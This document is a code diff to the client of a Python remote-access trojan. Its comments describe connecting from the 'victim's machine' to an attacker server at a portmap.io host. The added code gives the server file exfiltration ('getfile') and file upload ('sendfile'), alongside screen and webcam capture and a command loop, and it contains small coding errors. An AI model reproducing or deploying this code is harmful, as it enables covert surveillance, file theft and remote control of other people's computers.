@@ -14,6 +14,20 @@ import cv2
 import pyscreenshot as ImageGrab
 import platform
 
+
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
+
+host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
+port=35135  # it will store port number on which server is listening
+#host="192.168.29.157"
+#port=5050
+
+s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
+					   # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
+					   # A socket is opened at an ephemeral port on victim machine that is a random port number between 49153-65535 assigned by OS 
+
+
 # to record screen
 def capture_screen():
 	SCREEN_SIZE=pyautogui.size()
@@ -50,17 +64,6 @@ def capture_webcam():
 	out.release()
 	cv2.destroyAllWindows()
 
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for outgoing connection from victim's machine
-
-host="KartikBansal-35135.portmap.io"  # it will store static IP of server/ dynamic IP of machine on which server.py file is running
-port=35135  # it will store port number on which server is listening
-#host="192.168.29.157"
-#port=5050
-
-s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
-					   # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
-					   # A socket is opened at an ephemeral port on victim machine that is a random port number between 49153-65535 assigned by OS 
 
 while True:  # An infinite loop to execute multiple commands recieved from server
 	try:
@@ -114,6 +117,53 @@ while True:  # An infinite loop to execute multiple commands recieved from serve
 
 			response=os.getcwd()+"> "
 			s.send(response.encode())
+			continue
+
+		if data[:].decode("utf-8").split(" ")[0] == "getfile":
+			filepath=data[:].decode("utf-8").split(" ")[1]
+			s.send("sending_file".encode())
+			try:
+				f=open(filepath,"rb")
+				data=f.read()
+				l=len(data)
+				s.send(str(l).encode())
+				s.recv(1024)
+				s.send(data)
+				s.recv(1024)
+				f.close()
+
+			except:
+				s.send("0".encode())
+				s.recv(1024)
+
+			ouptut=os.getcwd() + "> "
+			s.send(output.encode())
+			continue
+
+		if data[:].decode("utf-8").split(" ")[0] == "sendfile":
+			filepath=data[:].decode("utf-8").split(" ")[1]
+			s.send("recieving_file".encode())
+			filename=os.path.basename(filepath)
+			l=int(s.recv(20480).decode())
+
+			if l==0:
+				pass		
+
+			else:
+				f=open(filename,"wb")
+				s.send("start".encode())
+				curr_len=0
+				while curr_len<l:
+					data=s.recv(204800)
+					curr_len+=len(data)
+					f.write(data)
+					s.send(str(curr_len).decode())
+
+				s.recv(1024)
+				f.close()
+
+			output=os.getcwd() + "> "
+			s.send(output.encode())
 			continue
 
 
